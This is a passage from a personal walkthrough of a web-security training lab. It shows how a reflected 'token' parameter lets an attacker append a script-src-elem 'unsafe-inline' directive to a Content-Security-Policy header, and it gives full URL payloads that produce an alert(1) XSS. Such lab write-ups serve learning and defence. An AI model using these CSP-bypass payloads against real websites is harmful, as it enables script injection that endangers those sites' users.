![](/assets/images/XSS/Pasted%20image%2020250728025616.png)

However checking the response in burp shows that a header:

```
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

![](/assets/images/XSS/Pasted%20image%2020250728025845.png)

The `token=` field is interesting. We can try to inject something in it from the URL. 

```
https://LABID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=1
```

We can see that it works.

![](/assets/images/XSS/Pasted%20image%2020250728025921.png)

We can directly manipulate the CSP. We will now use `script-src-elem 'unsafe-inline'` to whitelist inline javascript. That's the javascript ran through \<script\> tags.

Payload in the URL to whitelist inline javascript:

```
token=1;script-src-elem 'unsafe-inline'
```

The final URL that gives us the XSS popup looks like this:

```
https://LABID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=1;script-src-elem%20%27unsafe-inline%27
```

## Conclusion:

While I was already familiar with XSS, especially the part about session hijacking by stealing cookies, which was something I had done on the CPTS path, majority of the information in these labs was new for me. This includes breaking angularJS sandbox, bypassing CSP, dangling markup attack and using CSRF tokens. I learnt a lot and will try to cover more web vulnerabilities in future.